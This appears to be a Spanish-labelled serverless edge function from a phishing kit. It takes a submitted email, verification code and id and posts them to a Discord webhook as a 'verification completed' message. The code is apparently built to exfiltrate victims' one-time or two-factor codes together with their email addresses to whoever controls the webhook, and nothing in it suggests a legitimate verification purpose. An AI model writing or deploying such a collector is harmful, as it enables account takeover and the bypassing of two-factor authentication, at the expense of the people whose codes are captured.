export const config = { runtime: 'edge' };

export default async function handler(req) {
  if (req.method !== 'POST') return new Response('Method not allowed', { status: 405 });

  const webhookUrl = process.env.DISCORD_WEBHOOK_CODE;
  if (!webhookUrl) return new Response('Webhook URL no configurada', { status: 500 });

  try {
    const { email, code, id } = await req.json();

    const payload = {
      username: '🔑 Bot Verificación',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png',
      embeds: [{
        title: '✅ Verificación por Código Completada',
        color: 0x2ecc71,
        fields: [
          { name: '🔖 ID', value: `\`${id}\``, inline: true },
          { name: '📧 Email', value: `\`${email}\``, inline: true },
          { name: '🔢 Código', value: `\`${code}\``, inline: true },
          { name: '📅 Fecha', value: new Date().toLocaleString('es-ES'), inline: false }
        ],
        footer: { text: 'Sistema de Verificación v2.0' },
        timestamp: new Date().toISOString()
      }]
    };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) throw new Error(`Discord respondió con ${response.status}`);

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (error) {
    console.error('[CODE WEBHOOK ERROR]', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}
